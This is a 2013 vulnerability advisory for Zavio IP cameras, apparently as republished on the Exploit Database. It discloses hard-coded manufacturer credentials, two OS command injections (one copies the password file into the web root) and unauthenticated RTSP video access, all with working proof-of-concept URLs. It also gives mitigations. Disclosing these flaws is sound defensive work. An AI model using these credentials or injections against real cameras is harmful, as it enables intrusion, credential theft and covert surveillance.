Zavio IP Cameras multiple vulnerabilities

1. *Advisory Information*

Title: Zavio IP Cameras multiple vulnerabilities
Advisory ID: CORE-2013-0302
Advisory URL:
http://www.coresecurity.com/advisories/zavio-IP-cameras-multiple-vulnerabilities
Date published: 2013-05-28
Date of last update: 2013-05-28
Vendors contacted: Zavio
Release mode: User release

2. *Vulnerability Information*

Class: Use of hard-coded credentials [CWE-798], OS command injection
[CWE-78], Incorrect default permissions [CWE-276], OS command injection
[CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2567, CVE-2013-2568, CVE-2013-2569, CVE-2013-2570

3. *Vulnerability Description*

Multiple vulnerabilities have been found in Zavio IP cameras based on
firmware v1.6.03 and below, that could allow an unauthenticated remote
attacker:

   1. [CVE-2013-2567] to bypass user web interface authentication using
hard-coded credentials.
   2. [CVE-2013-2568] to execute arbitrary commands from the
administration web interface. This flaw can also be used to obtain all
credentials of registered users.
   3. [CVE-2013-2569] to access the camera video stream.
   4. [CVE-2013-2570] to execute arbitrary commands from the
administration web interface (post authentication only).

4. *Vulnerable Packages*

   . Zavio IP cameras based on firmware v1.6.03 and below.
   . All tests and PoCs were run on Zavio F3105 [1] and F312A [2] IP
cameras only. Other Zavio cameras and firmware versions are probably
affected too, but they were not checked.

5. *Non-Vulnerable Packages*

   . Vendor did not provide details. Contact Zavio for further information.

6. *Vendor Information, Solutions and Workarounds*

There was no official answer from Zavio after several attempts to report
these vulnerabilities (see [Sec. 9]). Contact vendor for further
information.
Some mitigation actions may be:

   . Do not expose the camera to Internet unless absolutely necessary.
   . Enable RTSP authentication.
   . Have at least one proxy filtering HTTP requests to
'manufacture.cgi' and 'wireless_mft.cgi'.
   . Check the parameter 'General.Time.NTP.Server' in requests to
'/opt/cgi/view/param'.

7. *Credits*

These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.

8. *Technical Description / Proof of Concept Code*

8.1. *Hard-Coded Credentials in Administrative Web Interface*

[CVE-2013-2567] Zavio IP cameras use the Boa web server [3], a popular
tiny server for embedded Linux devices. 'boa.conf' is the Boa
configuration file, and the following account can be found inside:

/-----
# MFT: Specify manufacture commands user name and password
MFT manufacture erutcafunam
-----/

 This account is not visible from the user web interface; users are not
aware of the existence and cannot eliminate it. Through this account it
is possible to access two CGI files located in '/cgi-bin/mft/':

   1. 'manufacture.cgi'
   2. 'wireless_mft.cgi'

The last file contains the OS command injection showed in the following
section.

8.2. *OS Command Injection*

[CVE-2013-2568] The file '/cgi-bin/mft/wireless_mft.cgi', has an OS
command injection in the parameter 'ap' that can be exploited using the
hard-coded credentials showed in the previous section:

/-----
username: manufacture
password: erutcafunam
-----/

 The following proof of concept copies the file where the user
credentials are stored in the web server root directory:

/-----
http://192.168.1.100/cgi-bin/mft/wireless_mft?ap=travesti;cp%20/var/www/secret.passwd%20/web/html/credenciales
-----/

 Afterwards, the user credentials can be obtained by requesting:

/-----
http://192.168.1.100/credenciales
-----/

8.3. *RTSP Authentication Disabled by Default*

[CVE-2013-2569] The RTSP protocol authentication is disabled by default.
Therefore, the live video stream can be accessed by a remote
unauthenticated attacker by requesting:

/-----
rtsp://192.168.1.100/video.h264
-----/

8.4. *OS Command Injection (Post-auth)*

[CVE-2013-2570] The command injection is located in the function
'sub_C8C8' of the binary '/opt/cgi/view/param'. The vulnerable parameter
is 'General.Time.NTP.Server'. The following proof of concept can be used
to obtain the complete list of access points by executing '/sbin/awpriv
ra0 get_site_survey':

/-----
http://192.168.1.100/cgi-bin/admin/param?action=update&General.Time.DateFormat=ymd&General.Time.SyncSource=NTP&General.Time.TimeZone=GMT-06:00/America/Mexico_City&General.Time.NTP.ServerAuto=no&General.Time.NTP.Server=sarasa!de!palermo;/sbin/awpriv%20ra0%20get_site_survey;&General.Time.NTP.Update=01:00:00&General.Time.DayLightSaving.Enabled=on&General.Time.DayLightSaving.Start.Type=date&General.Time.DayLightSaving.Stop.Type=date&General.Time.DayLightSaving.Start.Month=01&General.Time.DayLightSaving.Stop.Month=01&General.Time.DayLightSaving.Start.Week=1&General.Time.DayLightSaving.Stop.Week=1&General.Time.DayLightSaving.Start.Day=01&General.Time.DayLightSaving.Stop.Day=01&General.Time.DayLightSaving.Start.Date=01&General.Time.DayLightSaving.Stop.Date=01&General.Time.DayLightSaving.Start.Hour=00&General.Time.DayLightSaving.Stop.Hour=00&General.Time.DayLightSaving.Start.Min=00&General.Time.DayLightSaving.Stop.Min=00&Image.OSD.Enabled=off

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
